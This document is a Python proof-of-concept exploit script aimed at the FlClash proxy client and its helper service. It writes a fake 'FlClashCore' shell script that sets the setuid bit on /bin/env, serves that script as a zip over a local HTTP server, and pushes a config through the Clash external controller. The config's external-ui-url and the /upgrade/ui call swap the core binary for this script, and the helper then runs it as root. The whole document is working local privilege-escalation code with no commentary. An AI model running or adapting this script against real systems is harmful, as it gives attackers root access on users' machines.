import requests as r
import zipfile
import os, time, socket
import json

srv = "http://localhost:47890"
host = "http://localhost:9091"

server_address = '/tmp/uds_socket'
socket_family = socket.AF_UNIX
socket_type = socket.SOCK_STREAM
if os.path.exists(server_address):
    os.remove(server_address)

s = socket.socket(socket_family, socket_type)
s.bind(server_address)
s.listen(2)
config_data = { "external-controller": "localhost:9091" }
action = {
    "id": "set",
    "method": "updateConfig",
    "data": json.dumps(config_data)
}
init = { "id": "init", "method": "initClash", "data": 
        json.dumps({ "home-dir" : "/root/", "version" : 100 }) }

if not os.path.exists("/tmp/FlClashCore"):
    print("Creating malicious FlClashCore...")

    os.system("cat << EOF > /tmp/FlClashCore\n#!/bin/sh\nchmod +s /bin/env\ntouch /tmp/pwn\nEOF")
    os.chmod("/tmp/FlClashCore", 0o755)
    with zipfile.ZipFile("/tmp/FlClashCore.zip", "w") as zf:
        zf.write("/tmp/FlClashCore", arcname="FlClashCore")
else:
    print("Malicious FlClashCore already exists.")

input("WAIT>>>")
processes = os.popen("ps -ef").read()
if "FlClashCore" not in processes:
    payload = { "path": "/tmp/FlClashCore", "arg": f"{server_address}" }

    print("Starting FlClashCore...")
    print(r.post(f"{srv}/start", json=payload).text)
    # os.system(f"../FlClashCore {server_address}")
else:
    print("FlClashCore is already running.")

os.system("cd /tmp && python3 -m http.server 8080 &")
time.sleep(0.5)

client, addr = s.accept()

client.sendall(json.dumps(init).encode() + b'\n')
time.sleep(0.2)
print(client.recv(4096).decode())

client.sendall(json.dumps({"id":"setup", "method":"setupConfig", "data":""}).encode() + b'\n')
time.sleep(0.2)
print(client.recv(4096).decode())

client.sendall(json.dumps(action).encode() + b'\n')
time.sleep(0.2)
print(client.recv(4096).decode())

time.sleep(0.3)

print("Uploading malicious config...")

payload2 = {
    "path" : "",
    "payload" : """port: 0
socks-port: 0
redir-port: 0
tproxy-port: 0
mixed-port: 0
tun:
    enable: false
    device: 
    stack: gVisor
    dns-hijack: null
    auto-route: false
    auto-detect-interface: false
    file-descriptor: 0
tuic-server:
    enable: false
    listen: 
    certificate: 
    private-key: 
    ech-key: 
    mux-option:
        brutal:
            enabled: false
ss-config: 
vmess-config: 
authentication: null
skip-auth-prefixes: null
lan-allowed-ips: null
lan-disallowed-ips: null
bind-address: 0.0.0.0
inbound-tfo: false
inbound-mptcp: false
mode: rule
unified-delay: false
log-level: debug
ipv6: true
interface-name: 
routing-mark: 0
geox-url:
    geo-ip: "https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/geoip.dat"
    mmdb: "https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/geoip.metadb"
    asn: "https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/GeoLite2-ASN.mmdb"
    geo-site: "https://github.com/MetaCubeX/meta-rules-dat/releases/download/latest/geosite.dat"
geo-auto-update: false
geo-update-interval: 24
geodata-mode: false
geodata-loader: memconservative
geosite-matcher: succinct
tcp-concurrent: false
find-process-mode: strict
sniffing: false
global-client-fingerprint: 
global-ua: clash.meta/1.10.0
etag-support: true
keep-alive-idle: 0
keep-alive-interval: 0
disable-keep-alive: false
allow-lan : true
external-ui : /root/secure/
external-ui-url : http://localhost:8080/FlClashCore.zip """
}
headers = {"Content-Type": "application/json"}

try:
    print(r.put(f"{host}/configs", json=payload2, headers=headers).text)
    print(r.get(f"{host}/configs", headers=headers).text)
    print(r.post(f"{host}/upgrade/ui", headers=headers).text)
    print(r.post(f"{srv}/start", json=payload).text)
    print("OKKK")
except Exception as e:
    print(f"An error occurred: {e}")

client.close()
